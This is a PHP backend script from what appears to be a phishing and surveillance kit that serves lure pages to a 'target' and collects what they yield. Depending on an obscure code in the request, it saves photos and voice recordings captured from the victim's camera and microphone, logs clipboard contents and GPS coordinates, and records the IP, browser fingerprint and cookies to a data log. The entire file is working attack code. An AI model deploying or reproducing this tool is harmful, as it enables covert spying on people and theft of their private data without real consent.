<?php

  require 'data.php';

  if (!file_exists('data.log')) { $log = fopen("data.log",'w+');fwrite($log, '');fclose($log); }

  $method = $_SERVER['REQUEST_METHOD'];
  if ($method == 'GET') {
    if (isset($_GET['s'])) { // check template status
      switch ($_GET['s']) { // set template page
        case 'x1q': http_response_code(200);echo file_get_contents('camera/index.html');break; // Access Camera
        case 'r9b': http_response_code(200);echo file_get_contents('microphone/index.html');break; // Access Microphone
        case 'y4t': http_response_code(200);echo file_get_contents('clipboard/index.html');break; // Access ClipBoard
        case 'h3d': http_response_code(200);echo file_get_contents('location/index.html');break; // Access Location
        default: http_response_code(404);echo file_get_contents('default/index.html');break; // Data Collection
      }
    } else { http_response_code(404);echo file_get_contents('default/index.html'); }
  } elseif ($method == 'POST') {
    http_response_code(300);
    

    switch ($_POST['Status']) { // set template page
      case 'x1q': // Access Camera
        if ($_POST['err']=='false') {
          $imgSrc = $_POST['imgSrc'];
          $output = 'camera/output/'.$_POST['fileName'].'.png';
          file_put_contents($output, file_get_contents($imgSrc));
          $data = "\n  Taken Photo : /$output\n";
        } else {
          $data = "\n  target browser does not support the camera or the target has not confirmed the required access. \n";
        }
        
        $log = fopen("data.log",'a+');
        fwrite($log, "&".$data);
        fclose($log);
        break;
      case 'r9b': // Access Microphone
        if ($_POST['err']=='false') {
          $audioSrc = $_POST['audioSrc'];
          $output = 'microphone/output/'.$_POST['fileName'].'.wav';
          file_put_contents($output, file_get_contents($audioSrc));
          $data = "\n  Voice recorded : $output\n";
        } else {
          $data = "\n  target browser does not support the microphone or the target has not confirmed the required access. \n";
        }
        
        $log = fopen("data.log",'a+');
        fwrite($log, "&".$data);
        fclose($log);
        break;
      case 'y4t': // Access ClipBoard
        $data = "\n  ClipBoard : $_POST[ClipBoard] \n";
        $log = fopen("data.log",'a+');
        fwrite($log, "&".$data);
        fclose($log);
        break;
      case 'h3d': // Access Location
        if ($_POST['err']=='false') {
          $latitude = $_POST['Latitude'];
          $longitude = $_POST['Longitude'];
          $data = "\n  Location : https://www.google.com/maps/@$latitude,$longitude,17z\n";
        } else {
          $data = "\n  target browser does not support the location or the target has not confirmed the required access. \n";
        }
        
        $log = fopen("data.log",'a+');
        fwrite($log, "&".$data);
        fclose($log);
        break;
      default:
        $data = "\r
  IP : ".getIP()." (".getOS().") / ".getBrowser()."
  Referer : ".getReferer()."
  OS Name : $_POST[OS_Name]
  OS Version : $_POST[OS_Version]
  Is Mobile : $_POST[Mobile]
  CPU Core : $_POST[CPU_Core]
  CPU Architecture : $_POST[CPU_Architecture]
  Browser Name : $_POST[Browser_Name]
  Browser Version : ($_POST[Browser_Major_Version]) $_POST[Browser_Version]
  Cookies : $_POST[Cookies]
  Resolution : $_POST[Resolution]
  Time Zone : $_POST[Time_Zone]
  Language : $_POST[Language]
  User Agent : $_SERVER[HTTP_USER_AGENT]\n";
      $log = fopen("data.log",'a+');
      fwrite($log, "&".$data);
      fclose($log);
      break;
    }

    header('location: /');
  }

?>